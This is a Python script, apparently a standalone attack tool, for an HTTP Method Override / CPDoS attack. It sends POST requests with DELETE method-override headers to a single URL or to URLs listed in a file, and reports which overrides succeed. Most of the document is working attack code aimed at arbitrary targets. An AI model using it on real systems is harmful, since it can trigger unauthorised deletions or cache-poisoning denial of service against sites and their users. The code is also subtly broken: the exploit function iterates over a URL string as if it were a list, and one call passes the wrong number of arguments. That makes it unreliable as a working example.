'''
HTTP Method Override Attack (HMO)
The HTTP standard provides several HTTP methods for web servers and clients for performing transactions on the web. 
GET, POST, DELETE and PUT are arguably the most used HTTP methods in web applications and REST-based web services.
'''
import requests
import argparse
import os
import sys

def disable_ssl_warnings():
  
    import urllib3
    urllib3.disable_warnings()

def clear_terminal():
  
    os.system('cls' if os.name == 'nt' else 'clear')

def parse_args():
  
    parser = argparse.ArgumentParser(description="Exploit an HTTP Method Override to Perform CPDOS Attack")
    parser.add_argument('-u', '--url', help='URL to exploit.')
    parser.add_argument('-f', '--file', help='File containing URLs.')   
    parser.add_argument('-t', '--timeout', help='Maximum number of seconds to wait while requesting a web page (default: 10)', default=10, type=int)
    return parser.parse_args()

def exploit(urls, timeout):

    headers = {
        'HTTP-Method-Override': 'DELETE',
        'X-HTTP-Method-Override': 'DELETE',
        'X-Method-Override': 'DELETE',
        'Method-Override': 'DELETE',
        'X-HTTP-Method': 'DELETE',
        'HTTP-Method': 'DELETE',
        'Content-Type': 'application/json',
    }

    for url in urls:

        for header_name, header_value in headers.items():

            try:

                response = requests.post(url, headers={header_name: header_value}, timeout=timeout)
                
                
                if response.status_code == 200:
                    
                    print(f"HTTP request to {url} with {header_name} method override was successful.")
                
                else:
                    
                    print(f"HTTP request to {url} with {header_name} method override failed with status code {response.status_code}: {response.text}")
            
            except Exception as e:
                
                print(f"An error occurred with {header_name} method override for {url}: {str(e)}")

def main():
  
    disable_ssl_warnings()
    clear_terminal()

    print("""
    
    #########################################################
    #                                                       #
    #        HTTP Method Override Attack (HMO)              # 
    #               Severity: High                          #
    #                                                       #
    #########################################################
    
    [$] Description:
    
    The HTTP standard provides several HTTP methods for web servers and clients for performing transactions on the web. 
    GET, POST, DELETE and PUT are arguably the most used HTTP methods in web applications and REST-based web services. 
    https://cpdos.org/
    """)

    args = parse_args()

    if args.file:
        print("[#] Fetching URLs from Provided file...")
        
        with open(args.file, "r") as f:
            urls = [url.strip() for url in f.readlines() if url.strip()]
            print("\n[#] Fetched...")
            for url in urls:
                print(f"\n[#] Target: {url}")
                exploit(url, args.timeout,args)

    elif args.url:
        print(f"[#] Target: {args.url}")
        exploit(args.url, args.timeout)

if __name__ == "__main__":
    main()
